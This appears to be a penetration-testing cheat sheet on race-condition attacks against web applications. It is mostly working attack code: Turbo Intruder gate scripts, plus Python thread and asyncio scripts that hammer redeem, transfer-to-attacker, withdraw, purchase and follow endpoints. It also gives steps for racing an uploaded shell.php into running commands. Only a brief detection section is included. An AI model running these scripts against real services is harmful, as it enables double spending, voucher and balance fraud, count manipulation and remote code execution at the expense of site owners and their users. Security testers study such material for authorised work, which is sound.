# Race Condition Attacks

## Table of Contents

- [Overview](#overview)
- [Limit Overrun](#limit-overrun)
- [TOCTOU Attacks](#toctou-attacks)
- [Testing Techniques](#testing-techniques)
- [Turbo Intruder](#turbo-intruder)
- [Python Scripts](#python-scripts)
- [Common Scenarios](#common-scenarios)

---

## Overview

Race conditions occur when the outcome depends on the timing of uncontrollable events. In web applications, this happens when multiple requests modify shared state simultaneously.

**Key Concepts:**

- **Limit Overrun** - Bypassing rate limits or quotas
- **TOCTOU** - Time-of-check to time-of-use vulnerabilities
- **State Corruption** - Corrupting application state

---

## Limit Overrun

### Discount/Coupon Code Abuse

> Send multiple requests to apply coupon before validation completes

```text
Target: POST /apply-coupon
Goal: Apply same coupon multiple times
```

### Account Balance Bypass

> Race condition in balance check vs deduction

```text
1. Account balance: $100
2. Send 5 parallel requests to buy $100 item
3. All pass balance check before deduction
4. Result: 5 items purchased for $100
```

### Invite Code/Referral Abuse

> Single-use codes used multiple times

```text
1. Get single-use invite code
2. Send 50+ parallel requests with same code
3. Multiple accounts created with one code
```

---

## TOCTOU Attacks

### File Upload Race

> Upload and access file before validation

```text
1. Upload malicious file
2. Immediately request file before server validates/deletes
3. Execute malicious code
```

### Password Reset Race

> Race between token generation and email send

```text
1. Request password reset for victim
2. Simultaneously request reset for attacker
3. Token collision or reuse
```

### Session Race

> Login and session operations

```text
1. Login request
2. Simultaneously access authenticated endpoint
3. Session confusion
```

---

## Testing Techniques

### Single Packet Attack (HTTP/2)

Modern technique to send requests simultaneously without network jitter.

> Using Burp Suite (HTTP/2)

1. Send request to Repeater
2. Create tab group
3. Add multiple copies of request
4. "Send group in parallel (single-packet attack)"

### Last-Byte Sync

For HTTP/1.1, send all data except last byte, then send all last bytes together.

### Null Byte Sync

Send null bytes in keep-alive connection to sync timing.

---

## Turbo Intruder

### Basic Race Script

```python
# race.py - Basic race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(30):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')
    
def handleResponse(req, interesting):
    table.add(req)
```

### Gate-based Race

```python
# gate_race.py - Synchronized race with gate
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Queue all requests with same gate
    for i in range(50):
        engine.queue(target.req, gate='race1')
    
    # Open gate to release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

### HTTP/2 Single Packet Attack

```python
# single_packet.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Multiple Endpoints Race

```python
# multi_endpoint_race.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          pipeline=True)
    
    # First request - apply discount
    req1 = '''POST /apply-discount HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

code=DISCOUNT20'''
    
    # Second request - checkout
    req2 = '''POST /checkout HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

item=1'''
    
    for i in range(10):
        engine.queue(req1, gate='race1')
        engine.queue(req2, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## Python Scripts

### Threaded Race Condition

```python
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

url = "http://$rhost/api/redeem"
headers = {"Cookie": "session=$session_cookie"}
data = {"code": "DISCOUNT50"}

def send_request():
    try:
        r = requests.post(url, headers=headers, data=data)
        print(f"Status: {r.status_code}, Response: {r.text[:100]}")
    except Exception as e:
        print(f"Error: {e}")

# Send 50 concurrent requests
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(send_request) for _ in range(50)]
```

### Asyncio Race Condition

```python
import asyncio
import aiohttp

async def send_request(session, url, data):
    try:
        async with session.post(url, data=data) as response:
            text = await response.text()
            print(f"Status: {response.status}, Response: {text[:100]}")
    except Exception as e:
        print(f"Error: {e}")

async def main():
    url = "http://$rhost/api/transfer"
    data = {"amount": "1000", "to": "attacker"}
    
    async with aiohttp.ClientSession(cookies={"session": "$cookie"}) as session:
        tasks = [send_request(session, url, data) for _ in range(100)]
        await asyncio.gather(*tasks)

asyncio.run(main())
```

### Race with Timing Analysis

```python
import requests
import threading
import time
from queue import Queue

results = Queue()
url = "http://$rhost/api/withdraw"

def send_request(request_id):
    start = time.time()
    r = requests.post(url, data={"amount": "100"}, cookies={"session": "$cookie"})
    end = time.time()
    results.put({
        "id": request_id,
        "status": r.status_code,
        "time": end - start,
        "body": r.text[:50]
    })

threads = []
for i in range(30):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)

# Start all threads simultaneously
for t in threads:
    t.start()

for t in threads:
    t.join()

# Analyze results
while not results.empty():
    r = results.get()
    print(f"ID: {r['id']}, Status: {r['status']}, Time: {r['time']:.3f}s")
```

---

## Common Scenarios

### 1. E-commerce Double Spending

> Buy item multiple times with single balance

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def purchase():
    return requests.post(
        "http://$rhost/api/purchase",
        json={"item_id": 1, "quantity": 1},
        cookies={"session": "$session"}
    )

# Balance: $100, Item: $100
# Try to buy 10 times concurrently
with ThreadPoolExecutor(max_workers=10) as ex:
    results = list(ex.map(lambda _: purchase(), range(10)))

# Check how many succeeded
success = sum(1 for r in results if r.status_code == 200)
print(f"Successful purchases: {success}")
```

### 2. Follow/Like Count Manipulation

> Inflate counts beyond limits

```python
import requests
import threading

def follow_user():
    requests.post(
        "http://$rhost/api/follow",
        json={"user_id": "target"},
        cookies={"session": "$session"}
    )

threads = [threading.Thread(target=follow_user) for _ in range(100)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### 3. Voucher/Gift Card Abuse

> Redeem single-use voucher multiple times

```text
1. Add voucher to account
2. Race: Redeem voucher 50 times simultaneously
3. Each redemption credits account before voucher marked used
```

### 4. Password Reset Token Race

> Get another user's reset token

```text
1. Request reset for victim@target.com
2. Immediately request reset for attacker@target.com
3. Race may cause token collision or email confusion
```

### 5. File Upload Race

> Execute before deletion

```text
1. Upload malicious file: shell.php
2. Immediately request: /uploads/shell.php?cmd=id
3. Execute before validation deletes file
```

---

## Detection Indicators

### Signs of Race Conditions

- Multiple simultaneous requests cause unexpected behavior
- Response times vary significantly under load
- Counters/balances become inconsistent
- Single-use items can be used multiple times
- Error messages about concurrent modifications

### Success Indicators

```text
Before: Balance $100, 0 items
After: Balance $0, 5 items (should be 1)
```

---

## Tools

| Tool | Description |
| :--- | :--- |
| Turbo Intruder | Burp extension for race conditions |
| Race The Web | Go tool for testing race conditions |
| RacePWN | Python race condition tester |

---

## Quick Reference

### Turbo Intruder Setup

1. Send request to Turbo Intruder
2. Select race script template
3. Adjust `concurrentConnections` (30-100)
4. Use gate mechanism for synchronization
5. Run attack

### Key Parameters

| Parameter | Description | Recommended |
| :--- | :--- | :--- |
| concurrentConnections | Parallel connections | 30-100 |
| requestsPerConnection | Requests per conn | 1-100 |
| pipeline | HTTP pipelining | True/False |
| gate | Synchronization gate | Required for race |

### HTTP/2 Advantage

- Single packet attack eliminates network jitter
- All requests arrive simultaneously
- More reliable race exploitation

---

## ðŸ“š See Also

### Related Web Attacks

- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Reconnaissance and vulnerability discovery
- **[IDOR & Access Control](7.10.IDOR-Access-Control.md)** - Combine with race for privilege escalation
